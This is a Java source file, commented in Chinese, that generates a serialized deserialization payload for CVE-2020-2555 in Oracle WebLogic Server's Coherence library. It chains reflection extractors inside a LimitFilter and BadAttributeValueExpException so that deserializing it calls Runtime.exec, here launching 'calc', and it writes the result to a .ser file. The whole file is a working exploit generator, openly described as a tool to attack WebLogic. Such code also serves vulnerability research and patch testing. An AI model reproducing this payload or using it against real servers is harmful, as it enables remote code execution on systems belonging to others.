package com.supeream.ga0weI;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
/**
 * @author ga0weI
 * @time 20220606
 * @work: Generate a payload that exploits cve-2020-2555 vulnerability to attack WebLogic Server
 */

public class Payloadfor2555 {
    public static void main(String[] args) throws Exception{

//        Runtime runtime = Runtime.getRuntime();
//        ReflectionExtractor extractor22 = new ReflectionExtractor(
//                "exec",new Object[]{new String("calc")}
//        );
//        extractor22.extract(runtime);

        // 1、从Runtime.class里面调用getMethod拿到getRuntime方法
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}
        );
        // 2、通过invoke调用getRuntime方法，拿到Runtime对象
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}
        );
        // 3、调用Runtime对象的exec方法
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{new String[]{"calc"}}
        );
        //4、创建数组
        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };
        //5、通过ReflectionExtractor数组初始化ChainedExtractor对象并调用其extract方法，传入Runtime.Class对象
        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        //chainedExtractor.extract(Runtime.class);
        //6、获取LimitFilter对象
        LimitFilter limitFilter = new LimitFilter();

        //7、赋值
        //为m_comparetor赋值
        Class<? extends LimitFilter> aClass = limitFilter.getClass();
        Field m_comparator = aClass.getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter,chainedExtractor);

        //为m_oAnchorTop赋值
        Class<? extends LimitFilter> aClass1 = limitFilter.getClass();
        Field m_oAnchorTop = aClass.getDeclaredField("m_oAnchorTop");
        m_comparator.setAccessible(true);
        m_oAnchorTop.set(limitFilter,Runtime.class);

        //8、创建BadAttriButeValueException对象并为其val赋值为之前构造的LimitFilter对象
        BadAttributeValueExpException b = new BadAttributeValueExpException(null);
        Field val = b.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(b,limitFilter);

        //9、生成payload
        FileOutputStream fos = new FileOutputStream("cve-2020-2555.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(b);
        System.out.println("cve-2020-2555攻击payload已生成");

    }
}
